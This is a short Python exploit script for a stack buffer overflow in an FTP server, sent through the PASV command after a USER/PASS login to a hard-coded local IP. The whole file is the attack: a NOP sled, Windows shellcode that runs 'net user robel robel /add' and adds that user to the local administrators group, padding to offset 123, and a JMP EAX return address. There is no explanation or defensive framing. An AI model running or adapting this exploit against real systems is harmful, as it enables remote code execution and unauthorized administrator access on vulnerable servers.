#!/usr/bin/python 

import os,struct,socket

host = '192.168.1.29'
port = 21

# Add user robel to administrators group
shellcode = ("\x31\xc0"
"\x50"
"\x68\x2f\x61\x64\x64"
"\x68\x62\x65\x6c\x20"
"\x68\x73\x20\x72\x6f"
"\x68\x61\x74\x6f\x72"
"\x68\x69\x73\x74\x72"
"\x68\x64\x6d\x69\x6e"
"\x68\x75\x70\x20\x61"
"\x68\x6c\x67\x72\x6f"
"\x68\x6c\x6f\x63\x61"
"\x68\x6e\x65\x74\x20"
"\x68\x64\x20\x26\x20"
"\x68\x20\x2f\x61\x64"
"\x68\x6f\x62\x65\x6c"
"\x68\x65\x6c\x20\x72"
"\x68\x20\x72\x6f\x62"
"\x68\x75\x73\x65\x72"
"\x68\x6e\x65\x74\x20"
"\x89\xE0"
"\x6A\x01"
"\x50"
"\xBB\xc7\x93\xc2\x77"
"\xFF\xD3")

maxbuffer = 2127
offset = 123

# [*] Exact match at offset 123

payload = 'AAAA'
payload += '\x90' * 10
payload += shellcode
payload += 'A' * (offset - len(shellcode) - 14)
payload += struct.pack('<I',0x7C9785E7) # 7C9785E7 JMP EAX
payload += 'C' * (maxbuffer - len(payload))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(1024)
sock.send("USER user\r\n")
sock.recv(1024)
sock.send("PASS user\r\n")
sock.recv(1024)
sock.send("PASV " + payload + "\r\n")
sock.close()